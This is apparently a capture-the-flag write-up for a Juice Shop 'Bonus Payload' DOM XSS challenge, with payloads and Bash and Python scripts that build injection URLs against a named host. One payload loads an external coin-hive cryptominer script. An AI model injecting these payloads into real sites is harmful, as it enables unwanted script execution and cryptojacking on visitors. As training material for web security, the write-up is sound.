# Challenge 3: Bonus Payload

## Difficulty: ⭐ (1/5)

## Objective
Find and use a bonus payload that's not the typical XSS vector. This involves using the DOM XSS in a creative way.

## Solution

### Manual Steps:
1. Go to the search functionality
2. Instead of a typical XSS payload, use:
   ```html
   <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
   ```
3. This embeds a SoundCloud player (the bonus payload)

### Simpler Approach:
The actual bonus challenge often completes when you use specific event handlers:
```html
<iframe src="javascript:alert(`Juice Shop`)">
```

## Automated Script:
```bash
#!/bin/bash
# save as: bonus_payload.sh

TARGET="https://juice3.wonkatech.org"

echo "🎁 Executing Bonus Payload..."

# The bonus payload - an embedded media player
PAYLOAD='<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"></iframe>'

# URL encode
ENCODED=$(echo -n "$PAYLOAD" | python3 -c "import sys; from urllib.parse import quote; print(quote(sys.stdin.read()))")

echo "🎯 Bonus Payload URL:"
echo "${TARGET}/#/search?q=${ENCODED}"
echo ""
echo "📋 This embeds a SoundCloud player in the search results!"
```

## Python Script:
```python
#!/usr/bin/env python3
# save as: challenge_03_bonus_payload.py

from urllib.parse import quote

def bonus_payload(base_url):
    """Execute the bonus payload challenge"""
    
    print(f"🎯 Challenge 3: Bonus Payload on {base_url}")
    
    # Various bonus payloads
    payloads = [
        # SoundCloud embed
        '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"></iframe>',
        
        # YouTube embed
        '<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allowfullscreen></iframe>',
        
        # Cryptocurrency miner (fake)
        '<script src="https://coin-hive.com/lib/coinhive.min.js"></script>',
    ]
    
    for i, payload in enumerate(payloads, 1):
        encoded = quote(payload)
        url = f"{base_url}/#/search?q={encoded}"
        print(f"\n🎁 Bonus Payload #{i}:")
        print(f"Payload: {payload[:50]}...")
        print(f"URL: {url}")
    
    print("\n✅ Use any of these creative payloads to complete the challenge!")

if __name__ == "__main__":
    BASE_URL = "https://juice3.wonkatech.org"
    bonus_payload(BASE_URL)
```

## Learning Points
- XSS can be used for more than just alerts
- Attackers can embed malicious content like cryptominers, keyloggers, or phishing forms
- Creative payloads demonstrate the real impact of XSS vulnerabilities